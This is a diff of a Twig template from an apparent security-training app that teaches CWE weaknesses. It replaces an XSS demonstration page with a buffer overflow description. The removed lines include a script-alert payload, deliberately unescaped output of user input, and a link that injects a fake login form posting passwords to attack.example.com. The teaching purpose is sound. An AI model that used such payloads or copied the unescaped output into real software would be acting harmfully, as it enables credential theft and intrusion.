@@ -1,54 +1,32 @@
 {% extends 'cwe/base.html.twig' %}
 {% block solution %}
     <ul>
-        <li>Never trust data submitted by user. Always validate, sanitize or filter it!</li>
-        <li>
-            Always use HTML entities to display data from your database or submitted by user.
-            If you need to parse HTML content, so be sure to have a white list (and filter) for allowed HTML/JS/CSS content.
-        </li>
-        <li>
-            The input data may be used in a data base search too, so prepare it before using. Do not trust the data
-        </li>
+        <li>Use a language that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid</li>
+        <li>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. Examples include the Safe C String Library (SafeStr)</li>
     </ul>
 {% endblock %}
 {% block subcontent %}
 <div class="alert alert-info">
-    Cross-site scripting (XSS) vulnerabilities occur when:
-    <ul>
-        <li>Untrusted data enters a web application, typically from a web request.</li>
-        <li>The web application dynamically generates a web page that contains this untrusted data.</li>
-        <li>During page generation, the application does not prevent the data from containing content that is executable by a web browser, such as JavaScript, HTML tags, HTML attributes, mouse events, Flash, ActiveX, etc.</li>
-        <li>A victim visits the generated web page through a web browser, which contains malicious script that was injected using the untrusted data.</li>
-        <li>Since the script comes from a web page that was sent by the web server, the victim's web browser executes the malicious script in the context of the web server's domain.</li>
-        <li>This effectively violates the intention of the web browser's same-origin policy, which states that scripts in one domain should not be able to access resources or run code in a different domain.</li>
-    </ul>
-</div>
-{% if search %}
-    <div class="alert alert-success">
+    The program copies an input buffer to an output buffer without verifying that the size of the input buffer is less than the size of the output buffer, leading to a buffer overflow.
+
+    <p>
+    A buffer overflow condition exists when a program attempts to put more data in a buffer than it can hold, or when a program attempts to put data in a memory area outside of the boundaries of a buffer. The simplest type of error, and the most common cause of buffer overflows, is the "classic" case in which the program copies the buffer without restricting how much is copied. Other variants exist, but the existence of a classic overflow strongly suggests that the programmer is not considering even the most basic of security protections.
+    </p>
+    <p>
+        Applicable for:
         <ul>
-            <li>You searched for <strong>{{ search|raw }}</strong></li>
+            <li>C</li>
+            <li>C++</li>
+            <li>Assembly</li>
         </ul>
-    </div>
-{% endif %}
+    </p>
+</div>
+Execute the following C programs to see the weakness:
+<br/>
+<br/>
+{% for sampleFile in sampleFiles %}
 <div class="well">
-    Welcome {{ username|raw ?: 'visitor' }}
+    $ {{ sampleFile }}
 </div>
-<form method="post">
-    <div class="row">
-        <div class="col-md-6">
-            <input type="text" name="query" value="<script>alert('You have been hacked! Cookies could been stolen, redirect to malicious web site, etc.')</script>" class="form-control">
-        </div>
-        <div class="col-md-6 text-left">
-            <input name="submit" type="submit" class="btn btn-danger" value="Unsafe submit"/>
-            <input name="submit" type="submit" class="btn btn-success" value="Safe submit"/>
-        </div>
-    </div>
-</form>
-<hr/>
-<div class="alert alert-info">
-    The malicious link above could stole your credentials easily.
-</div>
-{% set maliciousLink = '?username=<br/>Please Login:<form name="input" action="http://attack.example.com/stealPassword.php" method="post">Username: <input type="text" name="username" class="form-control"/><br/>Password: <input type="password" name="password" class="form-control" /><input type="submit" value="Login" class="btn btn-success" /></form>' %}
-<a href='{{ maliciousLink }}'>External Malicious link</a> or
-<a href='{{ maliciousLink }}&safe=1'>External Malicious link sanitized</a>
+{% endfor %}
 {% endblock %}
